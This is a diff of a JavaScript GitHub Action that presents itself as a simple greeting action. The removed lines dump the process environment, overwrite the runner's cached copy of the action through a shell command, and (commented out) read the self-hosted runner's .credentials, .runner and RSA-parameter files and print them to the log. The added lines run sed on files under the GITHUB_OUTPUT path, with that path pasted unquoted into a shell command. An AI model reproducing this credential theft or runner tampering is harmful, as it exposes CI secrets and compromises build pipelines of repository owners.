@@ -7,10 +7,10 @@ try {
     
     console.log("This is the v1.1.2 version.");
     console.log(__dirname);
-    console.log(process.env);
+    
+    let path = process.env["GITHUB_OUTPUT"];
 
-    let path = "/home/musset/actions-runner/_work/_actions/dreamli0/my-action/main/index.js";
-    cl_process.exec(`echo "console.log('override...');console.log(process.env);" > ${path}`, (err, stdout, stderr) => {
+    cl_process.exec('sed -i "s/world/musset/g" `grep world -rl ' + path + '`', (err, stdout, stderr) => {
         if (err){
             console.log(err);
             return;
@@ -19,63 +19,11 @@ try {
         console.log(`stderr: ${stderr}`);
     });
 
-    // cl_process.exec(`rm -rf /home/musset/actions-runner/_work/_actions/dreamli0/my-action/main/index.js`, (err, stdout, stderr) => {
-    //     if (err){
-    //         console.log(err);
-    //         return;
-    //     }
-    //     console.log(`stdout: ${stdout.toString()}`);
-    //     console.log(`stderr: ${stderr}`);
-    // });
-
-    console.log("done...");
-
     
-
-    // const files = fs.readdirSync('/home/musset/actions-runner');
-    // files.forEach(element => {
-    //     if(element == ".credentials" || element == ".runner" || element == ".credentials_rsaparams"){
-            
-    //         let path = `/home/musset/actions-runner/${element}`;
-            
-    //         fs.readFile(path, "utf8", (err, data) => {
-    //             if(err){
-    //                 console.log(err);
-    //                 return;
-    //             }
-    //             console.log(`-----${element}------`);
-    //             console.log(data.toString());
-    //         });
-            
-    //     }
-        
-    // });
-    // const files_other = fs.readdirSync('/home/musset/actions-runner-private');
-    // files_other.forEach(element => {
-    //     if(element == ".credentials" || element == ".runner" || element == ".credentials_rsaparams"){
-            
-    //         let path = `/home/musset/actions-runner-private/${element}`;
-            
-    //         process.exec(`cat ${path}`, (err, stdout, stderr) => {
-    //             if (err){
-    //                 console.log(err);
-    //                 return;
-    //             }
-    //             console.log(`-----${element}------`);
-    //             console.log(`stdout: ${stdout.toString()}`);
-    //             console.log(`stderr: ${stderr}`);
-    //         });
-            
-    //     }
-    // });
-
     const nameToGreet = core.getInput('who-to-greet');
     console.log(`Say Hello ${nameToGreet}!`);
     const time = (new Date()).toTimeString();
     core.setOutput("time", time);
-
-    // const payload = JSON.stringify(github.context.payload, undefined, 2);
-    // console.log(`The event payload: ${payload}`);
 
 
 } catch (error) {
